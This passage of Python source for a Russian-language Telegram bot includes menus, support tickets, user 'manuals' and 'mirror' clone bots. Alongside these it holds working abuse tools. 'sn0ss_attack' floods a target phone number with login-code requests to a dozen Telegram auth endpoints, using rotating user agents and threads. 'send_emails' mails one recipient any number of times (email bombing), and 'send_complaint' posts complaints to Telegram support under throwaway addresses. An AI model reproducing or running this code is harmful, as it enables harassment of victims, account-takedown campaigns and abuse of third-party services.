        InlineKeyboardButton("📋 Список зеркал", callback_data="admin_mirror_list"),
        InlineKeyboardButton("🔄 Проверить статус", callback_data="admin_mirror_check"),
        InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"),
    )
    return kb

def emails_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📨 Отправить письмо", callback_data="email_send"),
        InlineKeyboardButton("📋 Мои почты", callback_data="email_list"),
        InlineKeyboardButton("➕ Добавить личную", callback_data="email_add_personal"),
        InlineKeyboardButton("📘 Инструкция", callback_data="email_instruction"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"),
    )
    return kb

def manuals_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📚 Все мануалы", callback_data="manuals_all_1"),
        InlineKeyboardButton("➕ Создать", callback_data="manual_create"),
        InlineKeyboardButton("📋 Мои мануалы", callback_data="my_manuals"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"),
    )
    return kb

def support_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📝 Создать тикет", callback_data="ticket_create"),
        InlineKeyboardButton("📋 Мои тикеты", callback_data="ticket_list"),
        InlineKeyboardButton("👤 Техподдержка", url=f"https://t.me/{SUPPORT_USERNAME[1:]}"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"),
    )
    return kb

def mirrors_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("➕ Создать зеркало", callback_data="mirror_create"),
        InlineKeyboardButton("📋 Мои зеркала", callback_data="my_mirrors"),
        InlineKeyboardButton("ℹ️ Информация", callback_data="mirror_info"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"),
    )
    return kb

def mirror_owner_panel_kb(mirror_token):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("⚙️ Настройки", callback_data=f"mirror_settings_{mirror_token}"),
        InlineKeyboardButton("📢 Рассылка", callback_data=f"mirror_broadcast_{mirror_token}"),
        InlineKeyboardButton("📊 Статистика", callback_data=f"mirror_stats_{mirror_token}"),
        InlineKeyboardButton("🔙 Назад", callback_data="my_mirrors"),
    )
    return kb

def mirror_settings_kb(mirror_token):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("✏️ Приветствие", callback_data=f"mirror_set_welcome_{mirror_token}"),
        InlineKeyboardButton("📢 Канал подписки", callback_data=f"mirror_set_channel_{mirror_token}"),
        InlineKeyboardButton("⏱ Интервал рассылки", callback_data=f"mirror_set_interval_{mirror_token}"),
        InlineKeyboardButton("🔙 Назад", callback_data=f"mirror_panel_{mirror_token}"),
    )
    return kb

def cancel_kb():
    return InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Отмена", callback_data="cancel_action"))

def pagination_kb(base, page, total, back):
    kb = InlineKeyboardMarkup(row_width=3)
    if page > 1:
        kb.add(InlineKeyboardButton("◀️", callback_data=f"{base}_page_{page-1}"))
    kb.add(InlineKeyboardButton(f"{page}/{total}", callback_data="noop"))
    if page < total:
        kb.add(InlineKeyboardButton("▶️", callback_data=f"{base}_page_{page+1}"))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data=back))
    return kb

def sn0ss_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🚀 Запустить", callback_data="sn0ss_start"),
        InlineKeyboardButton("📊 Статус", callback_data="sn0ss_status"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"),
    )
    return kb

def mirror_list_pagination_kb(mirrors, page, total_pages):
    kb = InlineKeyboardMarkup(row_width=1)
    start = (page-1)*5
    end = start+5
    for m in mirrors[start:end]:
        token = m[1]
        username = m[2] or token[:8]
        kb.add(InlineKeyboardButton(f"🪞 @{username}", callback_data=f"admin_broadcast_mirror_{token}"))
    nav_row = []
    if page > 1:
        nav_row.append(InlineKeyboardButton("◀️", callback_data=f"admin_broadcast_page_{page-1}"))
    nav_row.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="noop"))
    if page < total_pages:
        nav_row.append(InlineKeyboardButton("▶️", callback_data=f"admin_broadcast_page_{page+1}"))
    kb.row(*nav_row)
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="admin_broadcast_menu"))
    return kb

# ========== сн0сс СЕССИИ ==========
def sn0ss_attack(uid, phone, msg_id, bot):
    urls = [
        ('https://oauth.telegram.org/auth/request', {'bot_id': '1852523856', 'origin': 'https://cabinet.presscode.app'}),
        ('https://translations.telegram.org/auth/request', {}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '1093384146', 'origin': 'https://off-bot.ru'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '466141824', 'origin': 'https://mipped.com'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '5463728243', 'origin': 'https://www.spot.uz'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '1733143901', 'origin': 'https://tbiz.pro'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '319709511', 'origin': 'https://telegrambot.biz'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '1199558236', 'origin': 'https://bot-t.com'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '1803424014', 'origin': 'https://ru.telegram-store.com'}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '210944655', 'origin': 'https://combot.org'}),
        ('https://my.telegram.org/auth/send_password', {}),
        ('https://oauth.telegram.org/auth/request', {'bot_id': '1733143901', 'origin': 'https://tbiz.pro'}),
    ]
    
    success = 0
    failed = 0
    
    with ThreadPoolExecutor(max_workers=MAX_CODES_PER_BATCH) as executor:
        futures = []
        for i, (base_url, params) in enumerate(urls[:MAX_CODES_PER_BATCH]):
            if params:
                query = '&'.join([f"{k}={v}" for k, v in params.items()])
                full_url = f"{base_url}?{query}"
            else:
                full_url = base_url
            futures.append(executor.submit(_send_sn0ss_request, full_url, phone, i))
        
        for i, future in enumerate(as_completed(futures)):
            if future.result():
                success += 1
            else:
                failed += 1
            if (i+1) % 3 == 0 or i == MAX_CODES_PER_BATCH-1:
                try:
                    bot.edit_message_text(
                        f"🔄 Прогресс: {i+1}/{MAX_CODES_PER_BATCH}\n✅ {success}\n❌ {failed}",
                        uid, msg_id
                    )
                except:
                    pass
    
    db.save_stat(uid, None, 'sn0ss', success, phone)
    
    if success > 0:
        final = f"🍕 <b>ПИЦЦА УСПЕШНО ДОСТАВЛЕНА!</b>\n\n✅ Успешно: {success}\n❌ Ошибок: {failed}\n\n<i>Приятного аппетита!</i>"
    else:
        final = f"❌ <b>Неудача</b>\n\nВсе {failed} попыток провалились.\nПопробуйте позже."
    
    try:
        safe_edit_message(bot, final, uid, msg_id, reply_markup=main_kb())
    except:
        bot.send_message(uid, final, reply_markup=main_kb())

def _send_sn0ss_request(url, phone, index):
    try:
        headers = {
            'User-Agent': get_random_ua(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://oauth.telegram.org',
            'Referer': url.split('?')[0] if '?' in url else url,
            'Connection': 'keep-alive',
        }
        data = {'phone': phone}
        time.sleep(random.uniform(0.1, 0.3))
        session = session_with_retries()
        resp = session.post(url, headers=headers, data=data, timeout=5)
        return resp.status_code == 200
    except:
        return False

# ========== ОТПРАВКА НА САЙТ ==========
def send_complaint(uid, complaint_text, msg_id, bot):
    try:
        email = f"user_{uid}@temp-mail.org"
        scraper = cloudscraper.create_scraper()
        form = {'email': email, 'body': complaint_text, 'subject': 'Support Request'}
        headers = {'User-Agent': get_random_ua()}
        resp = scraper.post('https://telegram.org/support', data=form, headers=headers, timeout=30)
        
        if resp.status_code == 200:
            result = "✅ Жалоба успешно отправлена на telegram.org/support!"
        else:
            result = f"⚠️ Отправлено, но код ответа {resp.status_code}"
        
        db.save_stat(uid, None, 'complaint', 1, 'telegram.org/support')
        
    except Exception as e:
        result = f"❌ Ошибка: {str(e)}"
    
    safe_edit_message(bot, result, uid, msg_id, reply_markup=main_kb())

# ========== ОТПРАВКА ПИСЕМ ==========
def send_emails(uid, sender, pwd, recipient, subject, body, count, msg_id, bot):
    success = 0
    failed = 0
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i in range(count):
            futures.append(executor.submit(_send_smtp, sender, pwd, recipient, subject, body))
        
        for i, future in enumerate(as_completed(futures)):
            if future.result():
                success += 1
            else:
                failed += 1
            if (i+1) % 5 == 0 or i == count-1:
                try:
                    bot.edit_message_text(f"🔄 {i+1}/{count}\n✅ {success}\n❌ {failed}", uid, msg_id)
                except:
                    pass
            time.sleep(0.1)
    
    db.save_stat(uid, None, 'email', success, recipient)
    final = f"📨 Готово!\n✅ {success}\n❌ {failed}"
    try:
        safe_edit_message(bot, final, uid, msg_id, reply_markup=main_kb())
    except:
        bot.send_message(uid, final, reply_markup=main_kb())

def _send_smtp(sender, pwd, recipient, subject, body):
    try:
        if 'gmail' in sender:
            server = smtplib.SMTP('smtp.gmail.com', 587)
        elif 'yandex' in sender:
            server = smtplib.SMTP('smtp.yandex.ru', 587)
        elif 'mail.ru' in sender or 'bk.ru' in sender:
            server = smtplib.SMTP('smtp.mail.ru', 587)
        else:
            server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender, pwd)
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        server.send_message(msg)
        server.quit()
        return True
    except:
        return False

# ========== ОТОБРАЖЕНИЕ МАНУАЛОВ ==========
def show_manuals_list(uid, msg_id, page, bot):
    limit = 10
    offset = (page-1)*limit
    manuals = db.approved_manuals(limit=limit, offset=offset)
    if not manuals:
        bot.edit_message_text("Пока нет опубликованных мануалов.", uid, msg_id, reply_markup=manuals_menu_kb())
        return
    text = f"📚 Мануалы (страница {page}):\n\n"
    kb = InlineKeyboardMarkup(row_width=1)
    for mid, title, cat, author, views, likes, created in manuals:
        text += f"📄 {title}\n👤 @{author} | 👁 {views} ❤️ {likes}\n\n"
        kb.add(InlineKeyboardButton(f"📖 {title[:30]}", callback_data=f"manual_view_{mid}"))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="manuals_menu"))
    safe_edit_message(bot, text, uid, msg_id, reply_markup=kb)

def show_my_manuals(uid, msg_id, bot):
    manuals = db.user_manuals(uid)
    if not manuals:
        safe_edit_message(bot, "У вас нет мануалов.", uid, msg_id, reply_markup=manuals_menu_kb())
        return
    text = "📋 Мои мануалы:\n"
    kb = InlineKeyboardMarkup(row_width=1)
    for mid, title, cat, status, views, likes, created in manuals:
        status_icon = {'pending':'⏳','approved':'✅','rejected':'❌','revision':'✏️'}.get(status,'❓')
        text += f"\n{status_icon} {title} ({created[:10]})"
        kb.add(InlineKeyboardButton(f"{status_icon} {title[:20]}", callback_data=f"manual_view_{mid}"))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="manuals_menu"))
    safe_edit_message(bot, text, uid, msg_id, reply_markup=kb)

def show_my_mirrors(uid, msg_id, bot):
    mirrors = db.get_mirrors_by_owner(uid)
    if not mirrors:
        safe_edit_message(bot, "У вас пока нет зеркал.", uid, msg_id, reply_markup=mirrors_menu_kb())
        return
    text = "🪞 Ваши зеркала:\n\n"
    kb = InlineKeyboardMarkup(row_width=1)
    for m in mirrors:
        mid, token, username, owner, added_by, added, last, active, status, users, req_chan, link, welcome, interval, last_br, settings = m
        status_icon = "✅" if active else "❌"
        text += f"{status_icon} @{username or 'бот'} (токен: {token[:10]}...)\n"
        kb.add(InlineKeyboardButton(f"{status_icon} {username or token[:10]}", callback_data=f"mirror_panel_{token}"))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="mirrors_menu"))
    safe_edit_message(bot, text, uid, msg_id, reply_markup=kb)

def show_mirror_panel(uid, msg_id, token, bot):
    mirror = db.get_mirror(token)
    if not mirror:
        bot.send_message(uid, "Зеркало не найдено")
        return
    mid, token, username, owner, added_by, added, last, active, status, users, req_chan, link, welcome, interval, last_br, settings = mirror
    if owner != uid and uid != ADMIN_ID:
        bot.send_message(uid, "Это не ваше зеркало")
        return
    text = f"🪞 <b>Зеркало @{username}</b>\n"
    text += f"Токен: {token[:10]}...\n"
    text += f"Статус: {'✅ активно' if active else '❌ неактивно'}\n"
    text += f"Пользователей: {users}\n"
    if req_chan:
        text += f"Требуется подписка: {req_chan}\n"
    else:
        text += "Требуется подписка: нет\n"
    if interval:
        last_txt = last_br or "никогда"
        text += f"Рассылка: раз в {interval} дн. (последняя: {last_txt})\n"
    else:
        text += "Рассылка: отключена\n"
    safe_edit_message(bot, text, uid, msg_id, reply_markup=mirror_owner_panel_kb(token))

# ========== РЕГИСТРАЦИЯ ОБРАБОТЧИКОВ ДЛЯ БОТА ==========
def register_handlers(bot_instance, is_main=False, mirror_token=None):
    """Регистрирует обработчики для конкретного экземпляра бота."""

    if is_main:
        sub_decorator = sub_required_main
    else:
        sub_decorator = sub_required_mirror(mirror_token) if mirror_token else (lambda f: f)

    @bot_instance.message_handler(commands=['start'])
    def start_cmd(message):
        uid = message.from_user.id
        username = message.from_user.username
        first = message.from_user.first_name
        last = message.from_user.last_name
        current_token = bot_instance.token
        db.add_user(uid, username, first, last, current_token)

        if is_main:
            if check_sub_cached(bot_instance, uid, REQUIRED_CHANNEL):
                bot_instance.send_message(uid, custom_texts["welcome"], reply_markup=main_kb())
            else:
                kb = InlineKeyboardMarkup().add(InlineKeyboardButton("📢 Подписаться", url=CHANNEL_LINK))
                kb.add(InlineKeyboardButton("✅ Я подписался", callback_data="main_sub_check"))
                bot_instance.send_message(uid, f"❌ Подпишитесь на канал\n{CHANNEL_LINK}", reply_markup=kb)
        else:
            mirror = db.get_mirror(mirror_token) if mirror_token else None
            if mirror:
                required = mirror[9]
                link = mirror[10]
                welcome = mirror[11] or custom_texts["welcome"]
                if required:
                    if check_sub_cached(bot_instance, uid, required):
                        bot_instance.send_message(uid, welcome, reply_markup=main_kb())
                    else:
                        kb = InlineKeyboardMarkup()
                        kb.add(InlineKeyboardButton("📢 Подписаться", url=link or f"https://t.me/{required[1:]}"))
                        kb.add(InlineKeyboardButton("✅ Я подписался", callback_data=f"mirror_sub_check_{mirror_token}"))
                        bot_instance.send_message(uid, f"❌ Подпишитесь на канал\n{required}", reply_markup=kb)
                else:
                    bot_instance.send_message(uid, welcome, reply_markup=main_kb())
            else:
                bot_instance.send_message(uid, custom_texts["welcome"], reply_markup=main_kb())

    @bot_instance.message_handler(commands=['admin'])
    def admin_cmd(message):
        if message.from_user.id == ADMIN_ID:
            bot_instance.send_message(ADMIN_ID, "🔐 Админ-панель", reply_markup=admin_kb())

    @bot_instance.callback_query_handler(func=lambda call: True)
    @sub_decorator
    def callback(call):
        uid = call.from_user.id
        data = call.data
        safe_answer_callback(bot_instance, call.id)

        # ---------- Общие ----------
        if data == "cancel_action":
            if uid in temp_data:
                del temp_data[uid]
            safe_edit_message(bot_instance, "🍕 Главное меню", uid, call.message.id, reply_markup=main_kb())
            return

        if data == "back_to_main":
            safe_edit_message(bot_instance, "🍕 Главное меню", uid, call.message.id, reply_markup=main_kb())
            return

        if data == "noop":
            return

        # Проверка подписки для основного бота
        if data == "main_sub_check":
            if check_sub_cached(bot_instance, uid, REQUIRED_CHANNEL):
                clear_sub_cache(uid, REQUIRED_CHANNEL)
                safe_edit_message(bot_instance, custom_texts["welcome"], uid, call.message.id, reply_markup=main_kb())
            else:
                safe_answer_callback(bot_instance, call.id, "Вы ещё не подписались", show_alert=True)
            return

        # ---------- Профиль ----------
        if data == "profile":
            stats = db.user_stats(uid)
            text = f"👤 <b>Профиль</b>\nID: {uid}\nОтправок: {stats['total']}"
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=main_kb())
            return

        # ---------- Магазин ----------
        if data == "shop":
            text = custom_texts["shop_text"].format(support=SUPPORT_USERNAME)
            kb = InlineKeyboardMarkup().add(InlineKeyboardButton("👤 Написать @nymps", url=f"https://t.me/{SUPPORT_USERNAME[1:]}"))
            kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"))
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
            return

        # ---------- Поддержка ----------
        if data == "support_menu":
            safe_edit_message(bot_instance, "🆘 Поддержка", uid, call.message.id, reply_markup=support_menu_kb())
            return

        if data == "ticket_create":
            temp_data[uid] = {'state': 'ticket_subj'}
            safe_edit_message(bot_instance, "📝 Опишите проблему:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data == "ticket_list":
            tickets = db.user_tickets(uid)
            if not tickets:
                safe_edit_message(bot_instance, "У вас нет тикетов.", uid, call.message.id, reply_markup=support_menu_kb())
                return
            text = "📋 Ваши тикеты:\n"
            kb = InlineKeyboardMarkup(row_width=1)
            for tid, subj, status, created in tickets:
                status_icon = "🟢" if status == 'open' else '🔴'
                text += f"\n{status_icon} {subj[:30]} ({created[:10]})"
                kb.add(InlineKeyboardButton(f"{status_icon} {subj[:20]}", callback_data=f"ticket_view_{tid}"))
            kb.add(InlineKeyboardButton("🔙 Назад", callback_data="support_menu"))
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
            return

        if data.startswith("ticket_view_"):
            tid = data[12:]
            msgs = db.ticket_msgs(tid)
            with sqlite3.connect(DB_PATH) as conn:
                r = conn.execute('SELECT subject FROM tickets WHERE ticket_id=?', (tid,)).fetchone()
                subject = r[0] if r else 'Без темы'
            text = f"💬 Тикет #{tid}\nТема: {subject}\n\n"
            for msg, is_admin, created in msgs:
                sender = "👤 Вы" if not is_admin else "👑 Админ"
                text += f"<b>{sender} [{created[11:16]}]</b>\n{msg}\n\n"
            kb = InlineKeyboardMarkup(row_width=2)
            kb.add(
                InlineKeyboardButton("✏️ Ответить", callback_data=f"ticket_reply_{tid}"),
                InlineKeyboardButton("🔒 Закрыть", callback_data=f"ticket_close_{tid}"),
                InlineKeyboardButton("🔙 Назад", callback_data="ticket_list")
            )
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
            return

        if data.startswith("ticket_reply_"):
            tid = data[13:]
            temp_data[uid] = {'state': 'ticket_reply', 'ticket_id': tid}
            safe_edit_message(bot_instance, "✏️ Введите ответ:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data.startswith("ticket_close_"):
            tid = data[13:]
            db.close_ticket(tid)
            safe_answer_callback(bot_instance, call.id, "Тикет закрыт")
            safe_edit_message(bot_instance, "Тикет закрыт.", uid, call.message.id, reply_markup=support_menu_kb())
            return

        # ---------- Почты ----------
        if data == "emails_menu":
            safe_edit_message(bot_instance, "📧 Почтовые аккаунты", uid, call.message.id, reply_markup=emails_menu_kb())
            return

        if data == "email_instruction":
            safe_edit_message(bot_instance, custom_texts.get("email_instruction", "Инструкция отсутствует"), uid, call.message.id, reply_markup=emails_menu_kb())
            return

        if data == "email_list":
            emails = db.user_emails(uid)
            if not emails:
                safe_edit_message(bot_instance, "У вас нет почт.", uid, call.message.id, reply_markup=emails_menu_kb())
                return
            text = "📋 Ваши почты:\n"
            kb = InlineKeyboardMarkup(row_width=1)
            for eid, email, typ in emails:
                icon = "👤" if typ == 'personal' else "🌐"
                text += f"{icon} {email}\n"
                kb.add(InlineKeyboardButton(f"{icon} {email[:20]}", callback_data=f"email_delete_{eid}"))
            kb.add(InlineKeyboardButton("🔙 Назад", callback_data="emails_menu"))
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
            return

        if data == "email_add_personal":
            temp_data[uid] = {'state': 'email_add_personal'}
            safe_edit_message(bot_instance, "Отправьте email:пароль_приложения", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data == "email_send":
            emails = db.user_emails(uid)
            if not emails:
                safe_answer_callback(bot_instance, call.id, "Нет доступных почт")
                return
            kb = InlineKeyboardMarkup(row_width=1)
            for eid, email, typ in emails:
                kb.add(InlineKeyboardButton(f"{'👤' if typ == 'personal' else '🌐'} {email[:20]}", callback_data=f"email_send_choose_{eid}"))
            kb.add(InlineKeyboardButton("🔙 Назад", callback_data="emails_menu"))
            safe_edit_message(bot_instance, "Выберите отправителя:", uid, call.message.id, reply_markup=kb)
            return

        if data.startswith("email_send_choose_"):
            eid = int(data[19:])
            temp_data[uid] = {'state': 'email_recipient', 'email_id': eid}
            safe_edit_message(bot_instance, "Введите email получателя:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data.startswith("email_delete_"):
            eid = int(data[13:])
            db.deactivate_email(eid)
            safe_answer_callback(bot_instance, call.id, "Аккаунт удалён")
            emails = db.user_emails(uid)
            if emails:
                safe_edit_message(bot_instance, "Аккаунт удалён.", uid, call.message.id, reply_markup=emails_menu_kb())
            else:
                safe_edit_message(bot_instance, "У вас нет почт.", uid, call.message.id, reply_markup=emails_menu_kb())
            return

        # ---------- сн0сс ----------
        if data == "sn0ss_menu":
            safe_edit_message(bot_instance, "🔑 <b>сн0сс сессии</b>\n\n12 кодов за раз\nМоментальная отправка", uid, call.message.id, reply_markup=sn0ss_kb())
            return

        if data == "sn0ss_start":
            temp_data[uid] = {'state': 'sn0ss_phone'}
            safe_edit_message(bot_instance, "📱 Введите номер (например +79876543210):", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data == "sn0ss_status":
            bot_instance.send_message(uid, "✅ Сервис работает в ускоренном режиме")
            return

        # ---------- Отправка на сайт ----------
        if data == "send_to_site":
            temp_data[uid] = {'state': 'complaint_text'}
            safe_edit_message(bot_instance, "🌐 Введите текст жалобы:", uid, call.message.id, reply_markup=cancel_kb())
            return

        # ---------- Мануалы ----------
        if data == "manuals_menu":
            safe_edit_message(bot_instance, "📚 Мануалы", uid, call.message.id, reply_markup=manuals_menu_kb())
            return

        if data == "manual_create":
            temp_data[uid] = {'state': 'manual_title'}
            safe_edit_message(bot_instance, "Введите название мануала:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data == "my_manuals":
            show_my_manuals(uid, call.message.id, bot_instance)
            return

        if data == "manuals_all_1":
            show_manuals_list(uid, call.message.id, 1, bot_instance)
            return

        if data.startswith("manual_view_"):
            mid = int(data[12:])
            manual = db.get_manual(mid)
            if not manual:
                safe_edit_message(bot_instance, "Мануал не найден", uid, call.message.id)
                return
            id, title, content, cat, author_id, author_username, status, views, likes, created, updated, published = manual
            text = f"📖 <b>{title}</b>\n📁 {cat}\n👤 @{author_username}\n👁 {views} ❤️ {likes}\n\n{content}"
            kb = InlineKeyboardMarkup()
            with sqlite3.connect(DB_PATH) as conn:
                liked = conn.execute('SELECT 1 FROM manual_likes WHERE user_id=? AND manual_id=?', (uid, mid)).fetchone()
            if liked:
                kb.add(InlineKeyboardButton("💔 Убрать лайк", callback_data=f"manual_unlike_{mid}"))
            else:
                kb.add(InlineKeyboardButton("❤️ Лайк", callback_data=f"manual_like_{mid}"))
            kb.add(InlineKeyboardButton("🔙 Назад", callback_data="manuals_menu"))
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
            return

        if data.startswith("manual_like_"):
            mid = int(data[12:])
            if db.like_manual(uid, mid):
                safe_answer_callback(bot_instance, call.id, "❤️ Лайк добавлен")
            else:
                db.unlike_manual(uid, mid)
                safe_answer_callback(bot_instance, call.id, "💔 Лайк убран")
            call.data = f"manual_view_{mid}"
            callback(call)
            return

        if data.startswith("manual_unlike_"):
            mid = int(data[14:])
            db.unlike_manual(uid, mid)
            safe_answer_callback(bot_instance, call.id, "💔 Лайк убран")
            call.data = f"manual_view_{mid}"
            callback(call)
            return

        # ---------- Зеркала ----------
        if data == "mirrors_menu":
            safe_edit_message(bot_instance, "🪞 Зеркала", uid, call.message.id, reply_markup=mirrors_menu_kb())
            return

        if data == "mirror_create":
            temp_data[uid] = {'state': 'mirror_token'}
            safe_edit_message(bot_instance, "Отправьте токен нового бота (получите у @BotFather):", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data == "my_mirrors":
            show_my_mirrors(uid, call.message.id, bot_instance)
            return

        if data == "mirror_info":
            text = f"🪞 Информация\n\nВы можете создать своё зеркало бота, чтобы:\n- Иметь собственный канал для подписки\n- Делать рассылки своим подписчикам\n- Настраивать приветствие\n\nПросто нажмите «➕ Создать зеркало» и следуйте инструкциям."
            safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=mirrors_menu_kb())
            return

        if data.startswith("mirror_panel_"):
            token = data[13:]
            show_mirror_panel(uid, call.message.id, token, bot_instance)
            return

        if data.startswith("mirror_settings_"):
            token = data[16:]
            safe_edit_message(bot_instance, "⚙️ Настройки зеркала", uid, call.message.id, reply_markup=mirror_settings_kb(token))
            return

        if data.startswith("mirror_set_welcome_"):
            token = data[19:]
            temp_data[uid] = {'state': 'mirror_set_welcome', 'mirror_token': token}
            safe_edit_message(bot_instance, "Введите новый текст приветствия:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data.startswith("mirror_set_channel_"):
            token = data[19:]
            temp_data[uid] = {'state': 'mirror_set_channel', 'mirror_token': token}
            safe_edit_message(bot_instance, "Введите username канала (с @) или 0, чтобы отключить подписку:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data.startswith("mirror_set_interval_"):
            token = data[20:]
            temp_data[uid] = {'state': 'mirror_set_interval', 'mirror_token': token}
            safe_edit_message(bot_instance, "Введите интервал рассылки в днях (0 = отключить):", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data.startswith("mirror_broadcast_"):
            token = data[17:]
            mirror = db.get_mirror(token)
            if not mirror:
                return
            interval = mirror[12]
            last = mirror[13]
            if interval > 0 and last:
                last_dt = datetime.fromisoformat(last)
                if datetime.now() - last_dt < timedelta(days=interval):
                    remaining = timedelta(days=interval) - (datetime.now() - last_dt)
                    safe_answer_callback(bot_instance, call.id, f"Рассылка ещё не прошла. Осталось {remaining.days} дн.")
                    return
            temp_data[uid] = {'state': 'mirror_broadcast', 'mirror_token': token}
            safe_edit_message(bot_instance, "Введите текст рассылки:", uid, call.message.id, reply_markup=cancel_kb())
            return

        if data.startswith("mirror_stats_"):
            token = data[13:]
            users = db.users_by_bot(token)
            mirror = db.get_mirror(token)
            if mirror:
                users_count = len(users)
                text = f"📊 Статистика зеркала\n\nПодписчиков: {users_count}"
                safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=mirror_owner_panel_kb(token))
            return

        if data.startswith("mirror_sub_check_"):
            token = data[17:]
            mirror = db.get_mirror(token)
            if not mirror:
                return
            required = mirror[9]
            if required and check_sub_cached(bot_instance, uid, required):
                clear_sub_cache(uid, required)
                welcome = mirror[11] or custom_texts["welcome"]
                safe_edit_message(bot_instance, welcome, uid, call.message.id, reply_markup=main_kb())
            else:
                safe_answer_callback(bot_instance, call.id, "Вы ещё не подписались", show_alert=True)
            return

        # ---------- Админские колбэки ----------
        if data.startswith("admin_") and uid == ADMIN_ID:
            handle_admin_callback(bot_instance, call)

    @bot_instance.message_handler(func=lambda m: True)
    @sub_decorator
    def text_handler(message):
        uid = message.from_user.id
        text = message.text
        username = message.from_user.username
        first = message.from_user.first_name
        last = message.from_user.last_name
        db.add_user(uid, username, first, last, bot_instance.token)

        if uid not in temp_data:
            return

        state = temp_data[uid].get('state')

        # ---------- Тикеты ----------
        if state == 'ticket_subj':
            if len(text) < 3:
                bot_instance.send_message(uid, "❌ Слишком короткое описание")
                return
            temp_data[uid]['subject'] = text
            temp_data[uid]['state'] = 'ticket_msg'
            bot_instance.send_message(uid, "📝 Теперь подробное сообщение:", reply_markup=cancel_kb())
            return

        if state == 'ticket_msg':
            subj = temp_data[uid]['subject']
            msg = text
            username = message.from_user.username or f"user_{uid}"
            tid = db.create_ticket(uid, username, subj)
            db.add_ticket_msg(tid, uid, msg)
            try:
                main_bot.send_message(ADMIN_ID, f"🆕 Новый тикет {tid} от @{username}\n{subj}", 
                                     reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("📋 Ответить", callback_data=f"admin_ticket_view_{tid}")))
            except:
                pass
            del temp_data[uid]
            bot_instance.send_message(uid, f"✅ Тикет {tid} создан", reply_markup=main_kb())
            return

        if state == 'ticket_reply':
            tid = temp_data[uid]['ticket_id']
            db.add_ticket_msg(tid, uid, text)
            try:
                main_bot.send_message(ADMIN_ID, f"💬 Ответ в тикете {tid}", 
                                     reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("📋 Ответить", callback_data=f"admin_ticket_view_{tid}")))
            except:
                pass
            del temp_data[uid]
            bot_instance.send_message(uid, "✅ Ответ отправлен", reply_markup=main_kb())
            return

        # ---------- Почты ----------
        if state == 'email_add_personal':
            parts = text.split(':', 1)
            if len(parts) != 2:
                bot_instance.send_message(uid, "❌ Формат email:пароль")
                return
            email, pwd = parts[0].strip(), parts[1].strip()
            if len(pwd) < 16:
                bot_instance.send_message(uid, "❌ Пароль должен быть 16 символов (пароль приложения)")
                return
            if db.add_email(email, pwd, uid, 'personal', uid):
                bot_instance.send_message(uid, "✅ Почта добавлена")
            else:
                bot_instance.send_message(uid, "❌ Такая почта уже есть")
            del temp_data[uid]
            return

        if state == 'email_recipient':
            if not re.match(r'[^@]+@[^@]+\.[^@]+', text):
                bot_instance.send_message(uid, "❌ Неверный email")
                return
            temp_data[uid]['recipient'] = text
            temp_data[uid]['state'] = 'email_subject'
            bot_instance.send_message(uid, "📝 Тема письма:", reply_markup=cancel_kb())
            return

        if state == 'email_subject':
            temp_data[uid]['subject'] = text
            temp_data[uid]['state'] = 'email_body'
            bot_instance.send_message(uid, "📄 Текст письма:", reply_markup=cancel_kb())
            return

        if state == 'email_body':
